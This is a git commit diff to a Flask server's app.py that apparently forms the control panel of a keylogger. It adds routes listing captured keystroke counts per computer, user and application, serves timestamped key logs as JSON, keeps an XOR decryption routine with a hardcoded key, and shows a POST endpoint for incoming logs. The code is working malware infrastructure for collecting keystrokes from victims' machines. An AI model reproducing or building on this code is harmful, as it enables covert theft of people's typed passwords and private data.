6d5e40b08e502b95e107803cbeb75379007aac45
Penime <penime1ather@proton.me>
2025-02-24 18:25:58 +0200

    start work on frontend

--- server/app.py
+++ server/app.py
@@ -1,18 +1,46 @@
 import json
-from flask import Flask, request, render_template
-
-def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
-    key: bytes = key.encode()
-    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+from flask import Flask, render_template, jsonify, request
 
 app = Flask(__name__, template_folder='templates', static_folder='static')
 
 with open('server/static/json/data.json', 'r+') as file:
     json_data = json.load(file)
 
+def decrypt_data(data: bytes, key='KopLeoRos') -> bytes:
+    key: bytes = key.encode()
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
 @app.route('/')
 def index():
-    return 'hello world'
+    computers = {}
+    
+    for computer_name, users in json_data.items():
+        app_count = 0
+        key_count = 0
+        
+        for user, apps in users.items():
+            app_count += len(apps)
+            key_count += sum(len(app.values()) for app in apps.values())
+            # for app, timestamps in apps.items():
+            #     key_count += sum(len(keys) for keys in timestamps.values())
+        
+        computers[computer_name] = {"app_count": app_count, "key_count": key_count}
+    
+    return render_template('index.html', computers=computers)
+
+@app.route('/computer/<computer_name>')
+def computer_logs(computer_name):
+    if computer_name not in json_data:
+        return jsonify({"error": "Computer not found"}), 404
+    
+    computer_data = json_data[computer_name]
+    details = {}
+    
+    for user, apps in computer_data.items():
+        for app, timestamps in apps.items():
+            details[app] = {"total_keys": sum(len(keys) for keys in timestamps.values()), "logs": timestamps}
+    
+    return jsonify(details)
 
 @app.route('/logs', methods=['POST'])
 def logs():
